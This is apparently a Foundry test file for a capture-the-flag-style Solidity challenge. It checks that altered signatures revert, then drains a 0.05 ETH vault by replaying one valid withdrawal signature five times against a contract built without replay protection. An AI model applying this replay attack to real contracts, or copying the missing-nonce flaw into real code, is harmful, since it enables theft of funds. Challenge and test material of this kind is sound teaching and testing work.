// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Level4_SignatureReplay} from "../src/Level4_SignatureReplay.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract Level4SignatureReplayTest is Test {
    Level4_SignatureReplay public instance;
    
    uint256 public signerPrivateKey;
    address public trustedSigner;
    
    address public player = address(0x1234);

    function setUp() public {
        // Create deterministic trusted signer
        signerPrivateKey = 0xabc123;
        trustedSigner = vm.addr(signerPrivateKey);

        // Deploy Level 4 Challenge with 0.05 ETH
        instance = new Level4_SignatureReplay{value: 0.05 ether}(trustedSigner);
        
        // Ensure player starts with 0 ETH for clear accounting
        vm.deal(player, 0 ether);
    }

    // Helper to generate a valid signature mimicking the server's behavior
    function _generateSignature(address _recipient, uint256 _amount) internal view returns (bytes memory) {
        bytes32 messageHash = keccak256(abi.encodePacked(address(instance), _recipient, _amount));
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, ethSignedMessageHash);
        return abi.encodePacked(r, s, v);
    }

    function test_InvalidSignatureReverts() public {
        vm.startPrank(player);

        // Create a valid signature for withdrawing 0.01 ETH
        bytes memory signature = _generateSignature(player, 0.01 ether);

        // Try to withdraw 0.02 ETH using the signature for 0.01 ETH (modified amount)
        vm.expectRevert("Invalid signature");
        instance.withdraw(player, 0.02 ether, signature);
        
        // Try to withdraw to another address using the player's signature (incorrect recipient)
        address anotherUser = address(0x5678);
        vm.expectRevert("Invalid signature");
        instance.withdraw(anotherUser, 0.01 ether, signature);

        vm.stopPrank();
    }

    function test_SignatureReplayExploit() public {
        vm.startPrank(player);

        // Assert initial vault balance
        assertEq(address(instance).balance, 0.05 ether, "Initial vault balance should be 0.05 ETH");

        // Create ONE valid signature authorizing the player to withdraw 0.01 ETH
        bytes memory signature = _generateSignature(player, 0.01 ether);

        // 1. Submit the valid signature once (works normally)
        instance.withdraw(player, 0.01 ether, signature);

        // 2. Submit THE EXACT SAME signature again (vulnerability: replay protection is missing)
        instance.withdraw(player, 0.01 ether, signature);
        
        // 3. Repeat to drain
        instance.withdraw(player, 0.01 ether, signature);
        instance.withdraw(player, 0.01 ether, signature);
        instance.withdraw(player, 0.01 ether, signature);

        // Assert the vault was fully drained
        assertEq(address(instance).balance, 0, "Vault was not fully drained");
        assertTrue(instance.isComplete(), "Challenge is not complete");
        
        // Player should have the full 0.05 ETH now
        assertEq(player.balance, 0.05 ether, "Player did not receive the stolen ETH");

        vm.stopPrank();
    }
}
